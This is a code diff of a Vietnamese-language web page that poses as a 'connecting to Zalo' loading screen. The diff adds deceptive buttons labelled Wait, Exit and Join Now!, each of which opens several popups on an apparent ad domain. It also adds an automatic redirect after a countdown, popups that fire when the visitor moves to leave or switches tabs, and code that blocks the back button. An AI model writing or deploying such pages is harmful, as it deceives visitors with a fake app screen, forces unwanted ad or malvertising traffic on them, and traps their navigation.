@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Whatsapp</title>
+  <title>Kết nối an toàn</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -18,51 +18,95 @@
       position: relative;
     }
 
-    /* Lớp phủ làm mờ */
     body::before {
       content: "";
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
-      background-color: rgba(255, 255, 255, 0.75); /* Trắng đục */
+      background-color: rgba(255, 255, 255, 0.75);
       z-index: 0;
     }
 
     .box {
       background: white;
-      padding: 30px 40px;
+      padding: 30px 20px;
       border-radius: 12px;
       text-align: center;
       box-shadow: 0 0 12px rgba(0,0,0,0.1);
       position: relative;
       z-index: 1;
+      max-width: 90%;
+      width: 400px;
     }
 
     h1 {
       color: #1877f2;
-      font-size: 24px;
+      font-size: 22px;
       margin-bottom: 10px;
     }
 
     p {
-      font-size: 16px;
+      font-size: 18px;
       color: #333;
+      margin-bottom: 20px;
     }
 
     #countdown {
       font-weight: bold;
       color: #ff4444;
     }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      margin: 10px 0;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .wait-btn { background-color: #4CAF50; color: white; }
+    .wait-btn:hover { background-color: #45a049; }
+
+    .exit-btn { background-color: #f44336; color: white; }
+    .exit-btn:hover { background-color: #d73833; }
+
+    .join-btn { background-color: #1877f2; color: white; }
+    .join-btn:hover { background-color: #155fd1; }
+
+    @media (max-width: 480px) {
+      .btn {
+        font-size: 16px;
+        padding: 14px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="box">
-    <h1>Đang kết nối Zalo</h1>
-    <script type='text/javascript' src='//seventhdisdainunlucky.com/19/eb/a4/19eba4539a2c104c61ac7b748d98d265.js'></script>
-    <p>Chờ chút... <span id="countdown">3</span> seconds</p>
+    <h1>Đang vào Zalo...</h1>
+    <p>Đợi chút <span id="countdown">5</span> giây</p>
+
+    <button class="btn wait-btn" onclick="openMultiplePopups(['https://seventhdisdainunlucky.com/nj20tm104e?key=ef104419bfd2d0cc6ef0175645e109e3','https://seventhdisdainunlucky.com/nj20tm104e?key=XXX'])">Wait</button>
+
+    <button class="btn exit-btn" onclick="openMultiplePopups(['https://seventhdisdainunlucky.com/cnz6vwfxv?key=d73dc6758831142ae9b72e4948feb1e7','https://seventhdisdainunlucky.com/extra-exit'])">Exit</button>
+
+    <button class="btn join-btn" onclick="openMultiplePopups(['https://seventhdisdainunlucky.com/fv080q9s8?key=670548c3e75936fea545f3dad6c9f85f','https://seventhdisdainunlucky.com/join1','https://seventhdisdainunlucky.com/join2'])">Join Now!</button>
   </div>
 
   <script>
-    let countdown = 3;
+    const link4 = "https://seventhdisdainunlucky.com/ehsj873i?key=b34cc7c4ee8b77a145388ddd572011cd";
+    const fallbackPopup = "https://seventhdisdainunlucky.com/fv080q9s8?key=670548c3e75936fea545f3dad6c9f85f";
+
+    // Mở nhiều popup
+    function openMultiplePopups(links) {
+      links.forEach(link => window.open(link, "_blank"));
+    }
+
+    // Tự động redirect sau 5s
+    let countdown = 5;
     const countdownEl = document.getElementById("countdown");
 
     const timer = setInterval(() => {
@@ -70,10 +114,33 @@
       countdownEl.textContent = countdown;
       if (countdown <= 0) {
         clearInterval(timer);
-        // 👉 Your redirect link here:
-        window.location.href = "https://seventhdisdainunlucky.com/ehsj873i?key=b34cc7c4ee8b77a145388ddd572011cd";
+        window.location.href = link4;
       }
     }, 1000);
+
+    // Popup khi chuột rời tab
+    let popupShown = false;
+
+    document.addEventListener("mouseout", function (e) {
+      if (e.clientY <= 0 && !popupShown && e.relatedTarget === null) {
+        popupShown = true;
+        window.open(fallbackPopup, "_blank");
+      }
+    });
+
+    // Popup khi chuyển tab
+    document.addEventListener("visibilitychange", function () {
+      if (document.visibilityState === 'hidden' && !popupShown) {
+        popupShown = true;
+        window.open(fallbackPopup, "_blank");
+      }
+    });
+
+    // Chặn back
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.pushState(null, null, location.href);
+    };
   </script>
 </body>
 </html>
